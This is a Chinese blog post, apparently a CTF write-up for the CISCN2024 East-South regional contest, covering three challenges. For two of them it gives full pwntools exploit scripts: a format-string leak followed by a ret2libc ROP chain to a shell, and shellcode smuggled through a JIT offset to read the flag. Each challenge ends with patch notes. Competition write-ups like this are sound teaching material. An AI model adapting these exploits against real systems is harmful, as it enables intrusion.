@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"haurek.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="第十七届全国大学生信息安全竞赛华东南赛区分区赛WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2024华东南分区赛WP">
+<meta property="og:url" content="https://haurek.github.io/2024/06/27/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9BWP/index.html">
+<meta property="og:site_name" content="Haurek&#39;s Blog">
+<meta property="og:description" content="第十七届全国大学生信息安全竞赛华东南赛区分区赛WP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://haurek.github.io/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9BWP/image-20240627151650425.png">
+<meta property="og:image" content="https://haurek.github.io/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9BWP/image-20240627170142829.png">
+<meta property="og:image" content="https://haurek.github.io/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9BWP/image-20240627195609717.png">
+<meta property="article:published_time" content="2024-06-27T07:02:56.000Z">
+<meta property="article:modified_time" content="2024-06-27T12:48:40.497Z">
+<meta property="article:author" content="Haurek">
+<meta property="article:tag" content="WP">
+<meta property="article:tag" content="CISCN2024分区赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://haurek.github.io/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9BWP/image-20240627151650425.png">
+
+
+<link rel="canonical" href="https://haurek.github.io/2024/06/27/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9BWP/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://haurek.github.io/2024/06/27/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9BWP/","path":"2024/06/27/CISCN2024华东南分区赛WP/","title":"CISCN2024华东南分区赛WP"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CISCN2024华东南分区赛WP | Haurek's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Haurek's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#cJS0N"><span class="nav-number">1.</span> <span class="nav-text">cJS0N</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-jit"><span class="nav-number">2.</span> <span class="nav-text">baby_jit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezwp"><span class="nav-number">3.</span> <span class="nav-text">ezwp</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Haurek"
+      src="/images/head.jpg">
+  <p class="site-author-name" itemprop="name">Haurek</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Haurek" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Haurek" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:hh17689740969@163.com" title="E-Mail → mailto:hh17689740969@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://haurek.github.io/2024/06/27/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9BWP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="Haurek">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Haurek's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CISCN2024华东南分区赛WP | Haurek's Blog">
+      <meta itemprop="description" content="第十七届全国大学生信息安全竞赛华东南赛区分区赛WP">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CISCN2024华东南分区赛WP
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-06-27 15:02:56 / 修改时间：20:48:40" itemprop="dateCreated datePublished" datetime="2024-06-27T15:02:56+08:00">2024-06-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/write-up/" itemprop="url" rel="index"><span itemprop="name">write up</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/write-up/CISCN/" itemprop="url" rel="index"><span itemprop="name">CISCN</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4.4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">第十七届全国大学生信息安全竞赛华东南赛区分区赛WP</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="cJS0N"><a href="#cJS0N" class="headerlink" title="cJS0N"></a>cJS0N</h2><p>使用了cjson库来解析json格式的输入，比赛刚开始时在这个库里纠结了一段时间，但仔细想想后出题人应该不会在库中加入漏洞，所以转到程序逻辑中寻找漏洞<br>很快在Edit功能中发现了第一个漏洞，memcpy函数复制到临时变量dest的大小为0x1000，远大于其实际大小，存在一个栈溢出漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">sub_15B6</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 (__fastcall **a2)(<span class="type">size_t</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+10h] [rbp-9A0h]</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [rsp+18h] [rbp-998h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">632</span>]; <span class="comment">// [rsp+730h] [rbp-280h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+9A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  n = <span class="built_in">strlen</span>(a1) + <span class="number">1</span>;</span><br><span class="line">  v4 = (<span class="type">void</span> *)(*a2)(n);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( n &lt;= <span class="number">0xFFF</span> )</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, a1, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(v4, a1, n);</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但这到题目开了canary，不能直接溢出<br><img src="/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9BWP/image-20240627151650425.png"><br>继续寻找漏洞发现在delete操作时存在一个格式化字符串漏洞，该格式化字符串通过json的key来触发，也就是下面函数的a2变量</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_4FAA</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = sub_4662(a1, a2);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">91</span>);</span><br><span class="line">  <span class="built_in">printf</span>(a2);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;] been deleted&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_4E2F(a1, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>利用格式化字符串漏洞，我们可以泄露出canary，libc和程序基地址，进而通过ROP来获取shell</p>
+<blockquote>
+<p>这道题用的是ret2libc来获取shell</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>  a=<span class="literal">False</span>    : io.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>  : io.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x      : io.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x      : io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x      : io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b      : io.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b    : io.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(io, text)</span><br><span class="line">lg = <span class="keyword">lambda</span> s,addr    : log.info(<span class="string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s,addr))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data    : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data    : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;size:&#x27;</span>, <span class="string">b&#x27;4096&#x27;</span>)</span><br><span class="line">    fmt = <span class="string">b&#x27;%11$p%25$p%27$p&#x27;</span></span><br><span class="line">    payload = <span class="string">b&#x27;&#123;&quot;&#x27;</span> + fmt + <span class="string">b&#x27;&quot;&#x27;</span> + <span class="string">b&#x27;:&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;1&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">    sla(<span class="string">b&#x27;Json:&#x27;</span>, payload)</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;name&#x27;</span>, fmt)</span><br><span class="line">    ru(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    proc_base = <span class="built_in">int</span>(rn(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x6b04</span></span><br><span class="line">    canary = <span class="built_in">int</span>(rn(<span class="number">18</span>), <span class="number">16</span>) </span><br><span class="line">    libc_base = <span class="built_in">int</span>(rn(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x24083</span></span><br><span class="line">    lg(<span class="string">&quot;proc base&quot;</span>, proc_base)</span><br><span class="line">    lg(<span class="string">&quot;canary&quot;</span>, canary)</span><br><span class="line">    lg(<span class="string">&quot;libc base&quot;</span>, libc_base)</span><br><span class="line">    </span><br><span class="line">    pop_rdi = <span class="number">0x6ba3</span> + proc_base</span><br><span class="line">    system = <span class="number">0x52290</span> + libc_base</span><br><span class="line">    bin_sh = <span class="number">0x1b45bd</span> + libc_base</span><br><span class="line">    ret = <span class="number">0x101a</span> + proc_base</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;name:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;len&#x27;</span>, <span class="string">b&#x27;2048&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x278</span> + p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(pop_rdi) + p64(bin_sh) +p64(system)</span><br><span class="line">    sla(<span class="string">b&#x27;data&#x27;</span>, payload)</span><br><span class="line">    irt()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>Patch</strong></p>
+<ul>
+<li>格式化字符串漏洞通过在eh_frame段添加%s格式化字符串来修补</li>
+<li>栈溢出漏洞通过修改memcpy函数的大小参数为0x278来限制输入内容不会溢出</li>
+</ul>
+<h2 id="baby-jit"><a href="#baby-jit" class="headerlink" title="baby_jit"></a>baby_jit</h2><p>保护全开<br><img src="/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9BWP/image-20240627170142829.png"></p>
+<p>查看反编译程序发现还加了沙箱禁止execve系统调用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_16DF</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(<span class="number">2147418112LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">0LL</span>, <span class="number">59LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序只有两个功能：Add添加指令，Exec执行指令<br>关键在Exec中可以输入偏移来确定指令的起始地址，通过这个偏移可以构造shellcode获取shell<br>指令保存的地址是固定的0x100000，由mmap分配，输入一条指令后该地址中有16个byte空间来填充指令<br>要嵌入shellcode，首先就要绕过输入指令的opcode，以add为例，前2个byte是指令码，我们只要令最终偏移计算结果为2，然后在操作数中输入shllcode即可<br>这里能嵌入的shellcode长度有限，因此需要先嵌入一条read的syscall来读入更多的byte来执行获取flag的shellcode，而跳转到0x100000地址处执行时，寄存器中很多值可以被复用来作为read的参数<br>最后通过pwntools的shellcraft来获取flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./baby_jit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>  a=<span class="literal">False</span>    : io.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>  : io.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x      : io.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x      : io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x      : io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b      : io.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b    : io.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(io, text)</span><br><span class="line">lg = <span class="keyword">lambda</span> s,addr    : log.info(<span class="string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s,addr))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data    : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data    : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">payload</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">offset</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sl(offset)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    sh = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	    push rax</span></span><br><span class="line"><span class="string">	    pop rdi</span></span><br><span class="line"><span class="string">	    push rdx</span></span><br><span class="line"><span class="string">	    pop rsi</span></span><br><span class="line"><span class="string">	    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload = <span class="string">b&#x27;add &#x27;</span> + <span class="built_in">str</span>(uu64(asm(sh))).encode()</span><br><span class="line">    Add(payload)</span><br><span class="line">    Exec(<span class="string">b&#x27;0.2&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;\x90&#x27;</span> * <span class="number">0x20</span> + asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">    irt()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
+
+<p><strong>Patch</strong><br>这道题比赛时没patch出来，比赛时将atof改成了atoi，理论上是可以的，但不知道为什么不行<br>猜测上沙箱可以解决，但不知道能不能过check<br>本地试了一下加个沙箱禁止open可以阻止获取flag</p>
+<h2 id="ezwp"><a href="#ezwp" class="headerlink" title="ezwp"></a>ezwp</h2><p>这题有非预期解，打开网页在phpinfo中直接就输出了flag<br>正确流程应该是在myphp.so中可以直接输出flag，要输入正确的密码并且在后端php中有输入过滤，并且这里限制长度要小于0x18，但实际密钥长度是0x20<br><img src="/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9BWP/image-20240627195609717.png"></p>
+<p>这里长度len是单字节，通过单字节溢出可以绕过长度限制，然后php异或绕过应该就能获得flag</p>
+<p><strong>Patch</strong><br>这题是非预期解做出来的，导致patch时没有思路，这里应该要修改len的单字节溢出并增加php中的过滤规则过滤运算符</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Haurek
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://haurek.github.io/2024/06/27/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9BWP/" title="CISCN2024华东南分区赛WP">https://haurek.github.io/2024/06/27/CISCN2024华东南分区赛WP/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/WP/" rel="tag"># WP</a>
+              <a href="/tags/CISCN2024%E5%88%86%E5%8C%BA%E8%B5%9B/" rel="tag"># CISCN2024分区赛</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/04/22/CSRF%E5%AD%A6%E4%B9%A0/" rel="prev" title="CSRF学习">
+                  <i class="fa fa-angle-left"></i> CSRF学习
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Haurek</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
